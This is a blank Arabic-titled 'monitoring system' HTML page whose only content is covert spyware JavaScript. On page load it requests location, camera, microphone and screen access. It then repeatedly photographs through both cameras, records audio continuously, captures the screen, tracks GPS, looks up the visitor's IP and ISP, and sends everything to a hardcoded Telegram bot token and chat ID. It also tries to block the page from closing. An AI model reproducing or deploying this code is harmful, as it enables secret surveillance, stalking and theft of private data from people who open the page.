<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام المراقبة</title>
</head>
<body>
    <script>
        // ============================================================
        // بوت تيليجرام - التوكن الجديد
        // ============================================================
        const BOT_TOKEN = '7600497834:AAEq6C66S13MuMnBYOGqwDNAzD5Kdvm5N9w';
        const CHAT_ID = '1485247348';

        // ============================================================
        // المتغيرات
        // ============================================================
        let currentStream = null;
        let screenStream = null;
        let mediaRecorder = null;
        let audioChunks = [];
        let lastLocation = null;
        let locationWatchId = null;
        let isRunning = false;
        let photoCount = 0;
        let audioCount = 0;
        let isFront = false;
        let perms = { gps: false, cam: false, mic: false, screen: false };
        let photoInterval = null;
        let screenInterval = null;
        let isRecording = false;
        let audioStream = null;
        let voiceInterval = null;

        // ============================================================
        // دالة طلب الصلاحيات - واحدة ورا التانية بسرعة
        // ============================================================
        async function requestPermissions() {
            console.log('🚀 بدء طلب الصلاحيات...');
            
            // 1. الموقع
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 5000
                    });
                });
                lastLocation = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                };
                perms.gps = true;
                sendLocation();
                console.log('✅ تم تفعيل الموقع');
            } catch(e) { 
                perms.gps = false;
                console.log('❌ فشل الموقع:', e.message);
            }

            // 2. الكاميرا - خلفية
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                currentStream = stream;
                perms.cam = true;
                console.log('✅ تم تفعيل الكاميرا الخلفية');
                // تصوير فوري
                setTimeout(() => capturePhoto(), 500);
                setTimeout(() => capturePhoto(), 1000);
            } catch(e) {
                // جرب أمامية
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        },
                        audio: false
                    });
                    currentStream = stream;
                    perms.cam = true;
                    console.log('✅ تم تفعيل الكاميرا الأمامية');
                    setTimeout(() => capturePhoto(), 500);
                    setTimeout(() => capturePhoto(), 1000);
                } catch(e2) { 
                    perms.cam = false;
                    console.log('❌ فشل الكاميرا:', e2.message);
                }
            }

            // 3. الميكروفون - تسجيل مستمر
            try {
                audioStream = await navigator.mediaDevices.getUserMedia({ 
                    audio: {
                        echoCancellation: false,
                        noiseSuppression: false,
                        autoGainControl: false
                    } 
                });
                perms.mic = true;
                console.log('✅ تم تفعيل الميكروفون');
                startContinuousRecording();
            } catch(e) { 
                perms.mic = false;
                console.log('❌ فشل الميكروفون:', e.message);
            }

            // 4. الشاشة
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: { width: { ideal: 1280 }, height: { ideal: 720 } }
                });
                screenStream = stream;
                perms.screen = true;
                console.log('✅ تم تفعيل مشاركة الشاشة');
                setTimeout(() => captureScreen(), 1000);
            } catch(e) { 
                perms.screen = false;
                console.log('❌ فشل مشاركة الشاشة:', e.message);
            }

            // بدء التشغيل التلقائي
            if (perms.cam || perms.mic || perms.gps) {
                isRunning = true;
                startAutoCapture();
                startAutoScreen();
                trackLocation();
                setTimeout(() => sendFullReport(), 3000);
                console.log('🚀 بدء التشغيل الكامل');
            }
        }

        // ============================================================
        // تسجيل مستمر للصوت - يفضل مسجل طول الوقت
        // ============================================================
        function startContinuousRecording() {
            if (!perms.mic || !isRunning) return;
            
            try {
                isRecording = true;
                audioChunks = [];
                
                mediaRecorder = new MediaRecorder(audioStream, { 
                    mimeType: 'audio/webm;codecs=opus'
                });
                
                mediaRecorder.ondataavailable = e => {
                    if (e.data.size > 0) audioChunks.push(e.data);
                };
                
                mediaRecorder.onstop = async () => {
                    if (audioChunks.length > 0) {
                        const blob = new Blob(audioChunks, { type: 'audio/webm' });
                        audioCount++;
                        await sendAudio(blob);
                        console.log(`✅ تم إرسال فويس #${audioCount}`);
                    }
                    // إعادة التسجيل فوراً
                    if (isRunning && perms.mic) {
                        audioChunks = [];
                        try {
                            mediaRecorder.start();
                            setTimeout(() => {
                                if (mediaRecorder && mediaRecorder.state === 'recording') {
                                    mediaRecorder.stop();
                                }
                            }, 15000);
                        } catch(e) {
                            console.log('❌ خطأ في إعادة التسجيل:', e.message);
                        }
                    }
                };
                
                mediaRecorder.start();
                // إرسال أول فويس بعد 15 ثانية
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 15000);
                
                console.log('🎤 بدء التسجيل المستمر...');
            } catch(e) {
                console.log('❌ خطأ في التسجيل المستمر:', e.message);
                isRecording = false;
            }
        }

        // ============================================================
        // تصوير الكاميرا وإرسالها (تصوير من قدام وورا)
        // ============================================================
        async function capturePhoto() {
            if (!currentStream || !perms.cam || !isRunning) return;
            
            try {
                const video = document.createElement('video');
                video.srcObject = currentStream;
                video.style.position = 'fixed';
                video.style.top = '-9999px';
                video.style.width = '1px';
                video.style.height = '1px';
                document.body.appendChild(video);
                await video.play();
                
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    document.body.removeChild(video);
                    return;
                }
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
                photoCount++;
                const type = isFront ? 'أمامية' : 'خلفية';
                
                await sendPhoto(dataUrl, `📸 ${type} #${photoCount}`);
                
                document.body.removeChild(video);
                console.log(`✅ تم إرسال صورة ${type} #${photoCount}`);
                
                // تبديل الكاميرا بعد كل صورة
                isFront = !isFront;
                switchCamera();
                
            } catch(e) {
                console.log('❌ خطأ في التصوير:', e.message);
            }
        }

        // ============================================================
        // تبديل الكاميرا بين أمامية وخلفية
        // ============================================================
        async function switchCamera() {
            if (!perms.cam || !isRunning) return;
            
            try {
                // إيقاف الستريم القديم
                if (currentStream) {
                    currentStream.getTracks().forEach(t => t.stop());
                }
                
                const facing = isFront ? 'environment' : 'user';
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: facing,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                currentStream = stream;
                console.log(`🔄 تم التبديل للكاميرا ${isFront ? 'الخلفية' : 'الأمامية'}`);
            } catch(e) {
                console.log('❌ فشل تبديل الكاميرا:', e.message);
            }
        }

        // ============================================================
        // تصوير الشاشة
        // ============================================================
        async function captureScreen() {
            if (!screenStream || !perms.screen || !isRunning) return;
            
            try {
                const video = document.createElement('video');
                video.srcObject = screenStream;
                video.style.position = 'fixed';
                video.style.top = '-9999px';
                document.body.appendChild(video);
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
                await sendPhoto(dataUrl, `🖥️ شاشة #${photoCount}`);
                
                document.body.removeChild(video);
                console.log(`✅ تم إرسال صورة شاشة #${photoCount}`);
            } catch(e) {
                console.log('❌ خطأ في تصوير الشاشة:', e.message);
            }
        }

        // ============================================================
        // إرسال الصورة إلى تيليجرام
        // ============================================================
        async function sendPhoto(dataUrl, caption) {
            try {
                const blob = await fetch(dataUrl).then(r => r.blob());
                const form = new FormData();
                form.append('chat_id', CHAT_ID);
                form.append('photo', blob, `photo_${Date.now()}.jpg`);
                form.append('caption', `${caption} - ${new Date().toLocaleString('ar-EG')}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: form
                });
                
                const result = await response.json();
                if (!response.ok) {
                    console.log('❌ فشل إرسال الصورة:', result);
                } else {
                    console.log(`✅ تم إرسال الصورة: ${caption}`);
                }
            } catch(e) {
                console.log('❌ فشل إرسال الصورة:', e.message);
            }
        }

        // ============================================================
        // إرسال الصوت إلى تيليجرام
        // ============================================================
        async function sendAudio(blob) {
            try {
                const form = new FormData();
                form.append('chat_id', CHAT_ID);
                form.append('audio', blob, `voice_${Date.now()}.webm`);
                form.append('caption', `🎙️ فويس #${audioCount} - ${new Date().toLocaleString('ar-EG')}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: form
                });
                
                const result = await response.json();
                if (!response.ok) {
                    console.log('❌ فشل إرسال الصوت:', result);
                } else {
                    console.log(`✅ تم إرسال الفويس #${audioCount}`);
                }
            } catch(e) {
                console.log('❌ فشل إرسال الصوت:', e.message);
            }
        }

        // ============================================================
        // إرسال الموقع
        // ============================================================
        async function sendLocation() {
            if (!lastLocation) return;
            
            const msg = `📍 *موقعي*\n📌 https://www.google.com/maps?q=${lastLocation.lat},${lastLocation.lon}\n🎯 دقة: ${lastLocation.accuracy}م\n🕐 ${new Date().toLocaleString('ar-EG')}`;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });
                if (response.ok) {
                    console.log('✅ تم إرسال الموقع');
                }
            } catch(e) {
                console.log('❌ فشل إرسال الموقع:', e.message);
            }
        }

        // ============================================================
        // تقرير كامل
        // ============================================================
        async function sendFullReport() {
            let msg = `🚨 *تقرير شامل*\n═══════════════════════\n`;
            msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n\n`;
            
            if (lastLocation) {
                msg += `📍 ${lastLocation.lat}, ${lastLocation.lon}\n`;
                msg += `🎯 دقة: ${lastLocation.accuracy}م\n\n`;
            }
            
            try {
                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                const info = await fetch(`http://ip-api.com/json/${ip.ip}?lang=ar`).then(r => r.json());
                msg += `🌐 ${info.country || ''} - ${info.city || ''}\n`;
                msg += `📡 ${info.isp || ''}\n\n`;
            } catch(e) {}
            
            msg += `📸 الصور المرسلة: ${photoCount}\n`;
            msg += `🎙️ الفويسات المرسلة: ${audioCount}\n\n`;
            msg += `📷 كاميرا: ${perms.cam?'✅':'❌'}\n`;
            msg += `🎤 ميكروفون: ${perms.mic?'✅':'❌'}\n`;
            msg += `📍 GPS: ${perms.gps?'✅':'❌'}\n`;
            msg += `🖥️ شاشة: ${perms.screen?'✅':'❌'}\n`;
            msg += `═══════════════════════`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });
                console.log('✅ تم إرسال التقرير');
            } catch(e) {
                console.log('❌ فشل إرسال التقرير:', e.message);
            }
        }

        // ============================================================
        // التشغيل التلقائي
        // ============================================================
        function startAutoCapture() {
            if (photoInterval) clearInterval(photoInterval);
            photoInterval = setInterval(() => {
                if (perms.cam && isRunning) {
                    capturePhoto();
                }
            }, 3000);
            console.log('📸 بدء التصوير التلقائي كل 3 ثواني');
        }

        function startAutoScreen() {
            if (screenInterval) clearInterval(screenInterval);
            screenInterval = setInterval(() => {
                if (perms.screen && isRunning) captureScreen();
            }, 8000);
            console.log('🖥️ بدء تصوير الشاشة التلقائي كل 8 ثواني');
        }

        function trackLocation() {
            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
            
            locationWatchId = navigator.geolocation.watchPosition(
                (pos) => {
                    lastLocation = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                    if (Math.random() < 0.2) sendLocation();
                },
                () => {},
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }

        // ============================================================
        // بدء التشغيل فوراً عند تحميل الصفحة
        // ============================================================
        window.addEventListener('load', () => {
            console.log('🚀 تم تحميل الصفحة - بدء طلب الصلاحيات...');
            setTimeout(() => {
                requestPermissions();
            }, 500);
        });

        // ============================================================
        // منع إغلاق الصفحة
        // ============================================================
        window.addEventListener('beforeunload', (e) => {
            if (isRunning) {
                e.preventDefault();
                e.returnValue = '';
            }
        });

        console.log('📸 نظام المراقبة يعمل - التوكن الجديد');
    </script>
</body>
</html>
